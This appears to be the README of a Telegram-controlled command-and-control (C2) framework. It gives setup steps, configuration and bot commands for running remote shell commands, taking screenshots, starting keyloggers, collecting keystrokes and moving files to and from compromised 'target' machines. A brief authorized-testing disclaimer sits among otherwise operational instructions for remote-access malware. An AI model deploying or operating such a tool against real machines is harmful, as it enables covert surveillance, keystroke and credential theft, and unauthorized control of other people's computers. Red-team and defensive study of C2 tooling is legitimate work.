# Enhanced C2 Server - Telegram Edition

This project includes a Telegram-based Command and Control (C2) server that allows you to control agents through a Telegram bot instead of a traditional web interface.

## Features

- Control agents through Telegram bot commands
- Execute shell commands on agents
- Take screenshots from agents
- Start/stop keyloggers
- Upload/download files
- Get system information
- Agent management
- All features from the original server now available via Telegram

## Requirements

- Python 3.8+
- Telegram Bot Token (get from @BotFather on Telegram)

## Installation

1. Install the required dependencies:
   ```bash
   pip install -r requirements.txt
   ```

2. Get a Telegram Bot Token:
   - Message @BotFather on Telegram
   - Use `/newbot` to create a new bot
   - Get your bot token
   - Get your Chat ID by messaging your bot and checking updates at `https://api.telegram.org/bot<TOKEN>/getUpdates`

3. Set up environment variables:
   ```bash
   export TELEGRAM_BOT_TOKEN="your_bot_token_here"
   export TELEGRAM_ADMIN_CHAT_ID="your_chat_id_here"
   ```

## Configuration

Create a `.env` file in the project root:

```env
TELEGRAM_BOT_TOKEN=your_bot_token_here
TELEGRAM_ADMIN_CHAT_ID=your_chat_id_here
SERVER_HOST=0.0.0.0
SERVER_PORT=8000
UPLOAD_DIR=uploads
DOWNLOAD_DIR=downloads
MAX_COMMAND_QUEUE_SIZE=100
MAX_FILE_SIZE=50000000
SESSION_TIMEOUT=3600
LOG_RETENTION_DAYS=30
```

## Usage

### Starting the Telegram C2 Server

```bash
python start_telegram_server.py
```

### Telegram Bot Commands

Once the server is running and your bot is configured:

- `/start` - Show welcome message and available commands
- `/help` - Show help information
- `/agents` - List all connected agents
- `/cmd <agent_id> <command>` - Execute command on agent
- `/info <agent_id>` - Get agent system information
- `/screenshot <agent_id>` - Take screenshot from agent
- `/keylog_start <agent_id>` - Start keylogger on agent
- `/keylog_stop <agent_id>` - Stop keylogger on agent
- `/keylog_data <agent_id>` - Get collected keystrokes
- `/upload <agent_id> <file_path>` - Upload file from agent
- `/download <agent_id> <filename>` - Download file to agent
- `/files` - List files on server

### Starting a Telegram C2 Client

```bash
python telegram_c2_client.py --client-id my_agent_1 --beacon-interval 20
```

### Using the Client Manager

```bash
# Interactive mode
python telegram_client_manager.py --interactive

# Start a client directly
python telegram_client_manager.py --start basic --client-id agent123 --interval 30
```

## Security Considerations

⚠️ Warning: This tool is designed for authorized penetration testing and educational purposes only. Misuse of this software could violate local, state, and federal laws. Always obtain proper written authorization before testing.

## Example Usage

1. Start the Telegram C2 server:
   ```bash
   python start_telegram_server.py
   ```

2. Start a client on a target machine:
   ```bash
   python telegram_c2_client.py --client-id target_agent
   ```

3. Use Telegram bot commands to control the agent:
   - In Telegram, message your bot: `/agents` to see connected agents
   - Execute commands like: `/cmd target_agent whoami`
   - Take screenshots: `/screenshot target_agent`

## Directory Structure

- `telegram_c2_server.py` - Main Telegram bot C2 server
- `telegram_c2_client.py` - Telegram-based C2 client
- `telegram_client_manager.py` - Client management utility
- `telegram_config.py` - Configuration for Telegram bot settings
- `start_telegram_server.py` - Start script for Telegram server
- `uploads/` - Directory for uploaded files
- `downloads/` - Directory for downloaded files

## Development

The Telegram C2 server maintains the same API structure and functionality as the original HTTP-based server but uses Telegram bot messages instead of HTTP requests for communication.